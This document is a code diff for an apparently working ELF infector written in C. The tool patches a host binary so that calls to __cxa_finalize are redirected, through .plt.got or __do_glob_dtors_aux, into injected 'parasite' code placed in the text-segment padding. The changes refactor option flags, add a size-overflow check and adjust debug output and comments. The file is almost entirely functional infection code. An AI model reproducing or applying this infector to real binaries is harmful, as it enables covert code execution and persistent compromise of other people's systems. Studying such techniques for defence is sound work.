@@ -1,25 +1,12 @@
-#include <stdio.h>
-#include <string.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/stat.h>
-#include <stdint.h>
-#include <errno.h>
-#include <sys/mman.h>
-#include <elf.h>
+#include <infect_cxa_finalize.h>
 
 long PAGE_SIZE = 0;
+uint8_t options = 0;
 
-#ifdef _DEBUG
-#define DBG(fmt, ...) \
-    printf(fmt, ##__VA_ARGS__)
-#else
-#define DBG(fmt, ...)
-#endif
+#define RET 0xc3
 
-#define ERR(fmt, ...) \
-    fprintf(stderr, fmt, ##__VA_ARGS__)
+const uint8_t qwordcmp[] = { 0x48, 0x83, 0x3d };
+const uint8_t qwordcall[] = { 0xff, 0x15 };
 
 #define PLTGOT_PROLOGUE_LEN     1
 uint8_t pltgot_prologue[] = {
@@ -55,39 +42,6 @@ uint8_t jump[5] = {
 
 uint8_t call[5] = {
     0xe8, 0x00, 0x00, 0x00, 0x00,
-};
-
-struct parasite_data {
-    union {
-        Elf64_Ehdr *elf;
-        uint8_t *bytes;
-    };
-    size_t size;
-    Elf64_Shdr *shdrs;
-
-    uint8_t *text_bytes;
-    size_t text_size;
-    size_t total_size;
-};
-
-struct parasite_host {
-    union {
-        Elf64_Ehdr *elf;
-        uint8_t *bytes;
-    };
-    size_t size;
-
-    Elf64_Phdr *phdrs;
-    Elf64_Shdr *shdrs;
-    Elf64_Shdr *plt_got;
-    Elf64_Sym *dyn_sym;
-    Elf64_Rela *rela_dyn;
-    size_t no_rela_dyn;
-    char *dyn_str;
-    uint8_t *do_glob_dtors;
-    uint8_t *jmp_to_payload;
-
-    uint8_t *scratch_space;
 };
 
 // If file_len contains a non-zero value, the file will be
@@ -258,7 +212,7 @@ static int get_parasite_text(struct parasite_data *parasite)
     }
 
     DBG("[DEBUG] Parasite .text\t\t@%p\n", parasite->text_bytes);
-    DBG("[DEBUG] Parasite size\t\t@%lu\n", parasite->text_size);
+    DBG("[DEBUG] Parasite size\t\t%lu\n", parasite->text_size);
     return 0;
 }
 
@@ -348,13 +302,13 @@ static int find_cxafin_pltgot(struct parasite_host *host)
 
     if (!cxafin_bytes) return -1;
 
-    DBG("[DEBUG] __cxa_finalize\t@%p\n", cxafin_bytes);
+    DBG("[DEBUG] __cxa_finalize\t\t@%p\n", cxafin_bytes);
 
     for (i=0; i < host->plt_got->sh_size; i++) {
         if (plt_got[i] == 0xff && plt_got[i+1] == 0x25) {
             saved_offt = *(uint32_t *)&plt_got[i+2];
             if (cxafin_bytes == (&plt_got[i+6] + saved_offt)) {
-                DBG("[DEBUG] code offset:\t0x%x\n", saved_offt);
+                DBG("[DEBUG] code offset:\t\t0x%x\n", saved_offt);
                 memcpy(&pltgot_epilogue[PLTGOT_EPILOGUE_JMPOFFT],
                        &plt_got[i], 6);
                 host->jmp_to_payload = &plt_got[i];
@@ -380,7 +334,11 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
     uint32_t inst_len;
 
 
-    if (host->plt_got) {
+    if (HIJACK_PLT(options)) {
+        if (!host->plt_got) {
+            ERR("mamma_mia: Can't hijack __cxa_finalize in .plt.got: not found\n");
+            return -1;
+        }
         prologue = pltgot_prologue;
         prologue_len = PLTGOT_PROLOGUE_LEN;
         epilogue = pltgot_epilogue;
@@ -388,7 +346,11 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
         shellcode_len += (PLTGOT_PROLOGUE_LEN + PLTGOT_EPILOGUE_LEN);
         shellcode_jmp_offt = PLTGOT_EPILOGUE_JMPOFFT;
         inst_len = 6;
-    } else if (host->do_glob_dtors) {
+    } else if (HIJACK_DTORS(options)) {
+        if (!host->do_glob_dtors) {
+            ERR("mamma_mia: Can't hijack __cxa_finalize in __do_glob_dtors_aux: not found\n");
+            return -1;
+        }
         prologue = dtors_prologue;
         prologue_len = DTORS_PROLOGUE_LEN;
         epilogue = dtors_epilogue;
@@ -397,18 +359,23 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
         shellcode_len += (DTORS_PROLOGUE_LEN + DTORS_EPILOGUE_LEN);
         inst_len = 7;
     } else {
+        ERR("mamma_mia: Invalid options\n");
         return -1;
     }
 
     for (i=0; i < host->elf->e_phnum; i++) {
         if (host->phdrs[i].p_type == PT_LOAD) {
             if (host->phdrs[i].p_flags & PF_X) {
-                DBG("[DEBUG] Total code segment size: %lu\n",
-                    parasite->total_size + (host->phdrs[i].p_memsz%PAGE_SIZE));
-                if (parasite->total_size + (host->phdrs[i].p_memsz%PAGE_SIZE) > PAGE_SIZE) {
+                uint64_t total_segment_size = parasite->total_size +
+                                              (host->phdrs[i].p_memsz%PAGE_SIZE);
+
+                if ((total_segment_size <  parasite->total_size) ||
+                    (total_segment_size > PAGE_SIZE)) {
                     ERR("mamma_mia: parasite is too large\n");
                     return -1;
                 }
+
+                DBG("[DEBUG] Total segment size:\t%lu\n", total_segment_size);
 
                 end_of_text = host->bytes +
                               host->phdrs[i].p_offset+host->phdrs[i].p_filesz;
@@ -454,26 +421,20 @@ static int mamma_mia(struct parasite_host *host, struct parasite_data *parasite)
     uint32_t offt = (uint32_t) ((uint64_t)end_of_text -
                                ((uint64_t)host->jmp_to_payload+5));
 
-    DBG("[DEBUG] jmp_to_payload: %p\n", host->jmp_to_payload);
-    if (host->plt_got) {
+    DBG("[DEBUG] jmp_to_payload:\t\t%p\n", host->jmp_to_payload);
+
+    if (HIJACK_PLT(options)) {
         *(uint32_t *)&jump[1] = offt;
         memcpy(host->jmp_to_payload, jump, 5);
-    } else if (host->do_glob_dtors) {
+    } else if (HIJACK_DTORS(options)) {
         *(uint32_t *)&call[1] = offt;
         memcpy(host->jmp_to_payload, call, 5);
-    } else {
-        return -1;
     }
 
     return 0;
 }
 
-#define RET 0xc3
-
-const uint8_t qwordcmp[] = { 0x48, 0x83, 0x3d };
-const uint8_t qwordcall[] = { 0xff, 0x15 };
-
-int find_cxafin_dtors(struct parasite_host *host)
+static int find_cxafin_dtors(struct parasite_host *host)
 {
     uint64_t i;
     uint32_t saved_offt;
@@ -506,9 +467,9 @@ int find_cxafin_dtors(struct parasite_host *host)
     return -1;
 }
 
-void usage(const char *name) __attribute__((noreturn));
+static void usage(const char *name) __attribute__((noreturn));
 
-void usage(const char *name)
+static void usage(const char *name)
 {
     ERR("Usage: %s [-p] [-d] <parasite.o> <host.elf>\n\n", name);
     ERR("\t-p\tHijack __cxa_finalize in .plt.got\n");
@@ -518,17 +479,15 @@ void usage(const char *name)
 
 int main(int argc, char **argv)
 {
-    int opt,
-        use_plt = 0,
-        use_do_glob_dtors = 0;
+    int opt;
 
     while ((opt = getopt(argc, argv, "pd")) != -1) {
         switch (opt) {
         case 'p':
-            use_plt++;
+            options |= OPT_PLT;
             break;
         case 'd':
-            use_do_glob_dtors++;
+            options |= OPT_DTORS;
             break;
         default:
             usage(argv[0]);
@@ -539,7 +498,7 @@ int main(int argc, char **argv)
     if  (optind > argc)
         usage(argv[0]);
 
-    if (!(use_do_glob_dtors ^ use_plt))
+    if (INVALID_OPTS(options))
         usage(argv[0]);
 
     struct parasite_host host;
@@ -567,17 +526,20 @@ int main(int argc, char **argv)
         goto free_exit;
     }
 
+    // marcello!
     if (get_host_sections(&host) == -1) {
         ERR("get_host_sections: failed to find required sections\n");
         goto free_exit;
     }
 
+    // what is it?
     if (get_parasite_text(&parasite) == -1) {
         ERR("get_parasite_sections: failed to find required sections\n");
         goto free_exit;
     }
 
-    if (use_plt) {
+    // what you doin?
+    if (HIJACK_PLT(options)) {
         parasite.total_size = parasite.text_size + PLTGOT_PROLOGUE_LEN+
                               PLTGOT_EPILOGUE_LEN;
 
@@ -590,7 +552,7 @@ int main(int argc, char **argv)
             ERR("find_cxafin_pltgot: failed to find __cxa_finalize()\n");
             goto free_exit;
         }
-    } else if (use_do_glob_dtors) {
+    } else if (HIJACK_DTORS(options)) {
         parasite.total_size = parasite.text_size + DTORS_PROLOGUE_LEN +
                               DTORS_EPILOGUE_LEN;
 
@@ -604,6 +566,7 @@ int main(int argc, char **argv)
         }
     }
 
+    // infecting text padding!
     if (mamma_mia(&host, &parasite) == -1)
         ERR("mamma_mia: text padding method failed\n");
 
